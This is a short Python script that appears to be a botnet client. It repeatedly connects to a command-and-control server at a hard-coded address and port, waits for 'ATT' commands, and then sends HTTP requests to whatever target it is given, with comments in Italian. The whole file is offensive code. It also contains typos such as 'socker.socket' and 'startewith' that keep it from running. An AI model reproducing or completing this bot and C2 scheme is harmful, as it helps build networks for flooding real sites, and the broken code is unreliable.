import socket, time, os, requests
import urllib.request

CNC_IP = "10.10.10.100"
CNC_PORT = 5002

def connect_to_cnc():
    while True:
        try:    
            s = socker.socket()
            s.connect((CNC_IP, CNC_PORT))
            return s
        except:
            time.sleep(5)

def listen(sock):
    while True:
        try:
            data = sock.recv(1024).decode().strip()
            if not data:
                break

            print(f"Received: {data}", flush = True)

            if data.startewith("ATT"):
                target = data.split(" ")[1]
                attack(target)

        except:
            break

def attack(target):
        
    url = f"http://{target}"

    with urllib.request.urlopen(url) as response:
        # Legge il contenuto della risposta
        body = response.read().decode('utf-8')
        
        # Puoi anche accedere allo status code e agli header
        status_code = response.getcode()
        
        print(f"Status Code: {status_code}")

while True:
    sock = connect_to_cnc()
    listen(sock)

